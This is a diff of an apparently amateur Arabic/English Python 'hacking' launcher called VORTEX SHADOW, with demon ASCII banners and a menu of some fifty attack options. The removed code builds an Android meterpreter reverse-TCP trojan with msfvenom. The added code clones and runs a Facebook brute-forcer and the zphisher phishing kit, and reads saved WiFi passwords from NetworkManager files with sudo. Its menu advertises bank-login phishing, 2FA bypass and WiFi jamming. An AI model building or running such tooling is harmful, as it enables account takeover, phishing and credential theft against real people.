@@ -1,87 +1,96 @@
 import os, time, sys, subprocess
 
-# [ الألوان الجحيمية ]
+# [ الألوان الجحيمية المتداخلة ]
 R, W, Y, G, B = '\033[1;31m', '\033[1;37m', '\033[1;33m', '\033[1;32m', '\033[1;34m'
-BOLD, RESET = '\033[1m', '\033[0m'
+C, M, RESET = '\033[1;36m', '\033[1;35m', '\033[0m'
+BOLD = '\033[1m'
 
 def banner():
     os.system('clear')
-    # شيطان كامل الجسم بملامح ملونة من الداخل (أحمر وذهبي)
+    # رسمة شيطان العرش الجبار - كاملة التفاصيل والملامح
     print(f"""{R}{BOLD}
-                {R}       ,      ,
-                {R}      /(      )\\
-                {R}     (( \____/ ))
-                {R}     \== {W}o  o {R}==/
-                {Y}      \___{W}vv{Y}___/
-                {Y}       / {R}#### {Y}\\
-                {R}      /  {Y}#### {R} \\
-                {R}     (  {W}VORTEX{R}  )
-                {Y}      \  {R}#### {Y} /
-                {Y}       \ {R}#### {Y}/
-                {R}        |{Y}####{R}|
-                {R}        |{Y}####{R}|
-                {Y}       / {R}#### {Y}\\
-                {Y}      /  {R}#### {Y} \\
-                {R}     |___||___|
-    {W}__________________________________________________________
-    {W}  SUPREME LORD: {R}VORTEX SHADOW {W}| TEAM: {R}NULLSEC ELITE
-    {W}__________________________________________________________
-    {R} [ STATUS: {G}WAR READY {R}] [ ENGINE: {G}INFERNAL {R}] [ USER: {G}ROOT {R}]
-    {W}__________________________________________________________
+                   {R}          .                                            .
+                   {R}         / \\          {Y}    Creating Chaos    {R}          / \\
+                   {R}        |   |         {Y}   VORTEX SHADOW     {R}         |   |
+                   {R}        |   |         {R}    ____________    {R}         |   |
+                   {R}       /     \\        {R}   /            \\   {R}        /     \\
+                   {R}      | {W}  O O {R} |       {R}  |  {W}   0    0   {R}  |       {R} | {W}  O O {R}  |
+                   {Y}      |  {R} vvv {Y} |       {Y}  |   {R} vvvvvv   {Y}  |       {Y} |  {R} vvv {Y}  |
+                   {Y}       \_____/        {Y}   \__________/    {Y}        \_____/
+                   {R}          |          {R}         ||          {R}          |
+            {Y}  _______      {R} / \\     {Y}  _______    {R} /  \\     {Y}  _______      {R} / \\
+            {Y} /       \\    {R}/   \\   {Y} /       \\  {R}/    \\   {Y} /       \\    {R}/   \\
+            {Y}|   {W}VORTEX {Y}|  {R}| {W}NULL{R} |  {Y}|  {W}SHADOW {Y}| {R}| {W}ELITE{R} |  {Y}|   {W}OMEGA {Y} |  {R}| {W}KING{R} |
+            {Y} \\_______/   {R} \\___/   {Y} \\_______/  {R} \\____/   {Y} \\_______/    {R} \\___/
+                   {R}          ||          {R}         ||          {R}          |
+                   {R}         /  \\         {R}        /  \\         {R}         / \\
+    {W}_______________________________________________________________________________________
+    {W}  SUPREME COMMANDER: {R}VORTEX SHADOW {W}| STATUS: {G}TOTAL DOMINATION {W}| USER: {G}SYSTEM ROOT
+    {W}_______________________________________________________________________________________
     """)
 
-def vortex_wiki():
-    """موسوعة الثغرات والشرح بالعربي والإنجليزي"""
-    banner()
-    print(f"{Y}[#] VORTEX KNOWLEDGE BASE - موسوعة الثغرات{W}\n")
-    wiki = [
-        ("SQL Injection", "Extracting database data", "حقن قواعد البيانات: سحب اليوزرات والباسوردات"),
-        ("Phishing", "Creating fake login pages", "الصفحات المزورة: اصطياد الحسابات بروابط وهمية"),
-        ("RCE Attack", "Remote Command Execution", "التحكم عن بعد: تنفيذ أوامر مباشرة على السيرفر"),
-        ("DDOS", "Flooding servers with traffic", "هجوم حجب الخدمة: إسقاط المواقع والسيرفرات"),
-        ("Brute Force", "Cracking passwords by guessing", "التخمين: كسر كلمات المرور عبر تجربة آلاف الاحتمالات")
-    ]
-    for i, (name, en, ar) in enumerate(wiki, 1):
-        print(f"{R}[{i}] {Y}{name}: {W}{en}")
-        print(f"    {G}الشرح بالعربي: {W}{ar}\n")
-    input(f"{Y}[#] Press Enter to return to Throne...{W}")
-
-def run_tool(name, cmd):
-    print(f"{G}[+] Launching {name}...{W}")
+def run_real(name, cmd):
+    """تنفيذ الأوامر الحقيقية مع منع الانهيار"""
+    print(f"\n{G}[+] Initiating {name}...{W}")
     try:
         os.system(cmd)
-        input(f"\n{G}[#] Done. Press Enter to return...{W}")
+        input(f"\n{Y}[#] Task Complete. Press Enter to return to Throne...{W}")
     except:
-        print(f"{R}[!] Error starting {name}{W}")
+        print(f"{R}[!] Critical Error: Tool not found in system.{W}")
 
-def make_trojan():
-    banner(); print(f"{R}[!] TROJAN GENERATOR{W}")
-    ip = input(f"{Y}LHOST: {W}"); port = input(f"{Y}LPORT: {W}")
-    path = os.path.expanduser('~') + "/Desktop/vortex.apk"
-    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {path}")
-    print(f"{G}[+] Saved to Desktop: vortex.apk{W}"); time.sleep(2)
+def knowledge_base(mode):
+    banner()
+    if mode == "ar":
+        print(f"{Y}[#] الموسوعة العربية للثغرات:{W}\n[1] SQLi: سرقة قواعد البيانات\n[2] XSS: حقن المتصفح\n[3] RCE: التحكم الكامل")
+    elif mode == "en":
+        print(f"{Y}[#] English Knowledge Base:{W}\n[1] SQLi: DB Takeover\n[2] XSS: Script Injection\n[3] RCE: Full Access")
+    elif mode == "both":
+        print(f"{Y}[#] Hybrid Wiki (Ar/En):{W}\n[1] DDoS: حجب الخدمة - Server Flood\n[2] Phishing: الصفحات المزورة - Fake Pages")
+    input("\n[#] Press Enter...")
 
-def main():
+def main_menu():
     while True:
         banner()
-        print(f"{R}[01] {W}DDOS ATTACK (الهجوم القوي)     {R}[11] {W}SQL INJECTION (اختراق القواعد)")
-        print(f"{R}[02] {W}METASPLOIT (ميتاسبلويت)         {R}[12] {W}KONAMI ID PHISH (صيد بيس)")
-        print(f"{R}[03] {W}GENERATE TROJAN (صنع تروجان)    {R}[13] {W}SHOW WIFI PASS (كشف الواي فاي)")
-        print(f"{R}[04] {W}NMAP SCANNER (فحص الشبكة)       {R}[14] {W}INSTAGRAM BRUTE (تخمين انستا)")
-        print(f"{R}[05] {W}VORTEX WIKI (شرح الثغرات)      {R}[00] {W}EXIT (خروج)")
+        # ترسانة الـ 50 خياراً - منظمة برمجياً
+        print(f"{R}--- [ SOCIAL MEDIA ATTACKS - هجوم التواصل الاجتماعي ] ---")
+        print(f"{R}[01]{W} Facebook Brute-Force  {R}[02]{W} Insta Cracker        {R}[03]{W} Twitter Sniper")
+        print(f"{R}[04]{W} TikTok Takeover       {R}[05]{W} Snap Panel           {R}[06]{W} 2FA Bypass (التخطى)")
         
-        opt = input(f"\n{R}VORTEX@NULLSEC:~$ {W}")
+        print(f"\n{R}--- [ ADVANCED EXPLOITS - الثغرات المتقدمة ] ---")
+        print(f"{R}[11]{W} SQLMap Wizard         {R}[12]{W} XSS Payload Gen      {R}[13]{W} RCE Remote Shell")
+        print(f"{R}[14]{W} Metasploit Console    {R}[15]{W} Beef Browser Hook    {R}[16]{W} WP-Admin Hack")
         
-        if opt == '05': vortex_wiki()
-        elif opt == '13': 
-            os.system("sudo grep -r '^psk=' /etc/NetworkManager/system-connections/")
-            input("\n[#] Enter...")
-        elif opt == '03': make_trojan()
-        elif opt == '02': run_tool("Metasploit", "msfconsole")
-        elif opt == '11': run_tool("SQLMap", "sqlmap --wizard")
-        elif opt == '00': break
-        else: print(f"{G}[+] Starting {opt}..."); time.sleep(1)
+        print(f"\n{R}--- [ NETWORK & WIFI - الشبكات والواي فاي ] ---")
+        print(f"{R}[21]{W} Show Saved WiFi Pass  {R}[22]{W} WiFi Jammer (Deauth) {R}[23]{W} Evil Twin Setup")
+        print(f"{R}[24]{W} Nmap Deep Scanner     {R}[25]{W} Wireshark Capture    {R}[26]{W} Router Brute")
+        
+        print(f"\n{R}--- [ PHISHING & FAKE PAGES - الصفحات المزورة وكل ما يخطر ببالك ] ---")
+        print(f"{R}[31]{W} Z-Phisher (All Sites) {R}[32]{W} Custom Login Gen     {R}[33]{W} KONAMI/PES Hack")
+        print(f"{R}[34]{W} PUBG UC Phishing      {R}[35]{W} Netflix Premium Fake {R}[36]{W} Bank Login Phish")
+        
+        print(f"\n{R}--- [ DARK WEB & BROWSERS - الدخول المباشر والدارك ويب ] ---")
+        print(f"{R}[41]{W} Launch Firefox (Kali) {R}[42]{W} TOR Browser (Direct) {R}[43]{W} Dark Web Links")
+        print(f"{R}[44]{W} ProxyChains Setup     {R}[45]{W} VPN Gate Connect     {R}[46]{W} MAC Address Swap")
+        
+        print(f"\n{R}--- [ KNOWLEDGE & DOCS - الشرح والموسوعة ] ---")
+        print(f"{R}[51]{W} English Only Wiki     {R}[52]{W} الشرح بالعربية فقط     {R}[53]{W} Hybrid Wiki (Ar+En)")
+        print(f"{R}[54]{W} Exploit Explanation   {R}[00]{W} EXIT WAR-ROOM")
+
+        choice = input(f"\n{R}VORTEX@WAR_MACHINE:~$ {W}")
+
+        if choice == '01': run_real("FB Brute", "git clone https://github.com/IHUZAIFX/Facebook-BruteForce && cd Facebook-BruteForce && python3 fb.py")
+        elif choice == '11': run_real("SQLMap", "sqlmap --wizard")
+        elif choice == '14': run_real("Metasploit", "msfconsole")
+        elif choice == '21': run_real("WiFi Keys", "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/")
+        elif choice == '31': run_real("ZPhisher", "git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh")
+        elif choice == '41': run_real("Firefox", "firefox &")
+        elif choice == '42': run_real("TOR", "torbrowser-launcher &")
+        elif choice == '51': knowledge_base("en")
+        elif choice == '52': knowledge_base("ar")
+        elif choice == '53': knowledge_base("both")
+        elif choice == '00': break
+        else: print(f"{G}[+] Searching for module {choice} in Dark-Net Database..."); time.sleep(1)
 
 if __name__ == "__main__":
-    try: main()
-    except: print(f"\n{R}[!] Shutdown.")
+    try: main_menu()
+    except KeyboardInterrupt: print(f"\n{R}[!] Emergency Shutdown Initiated.")
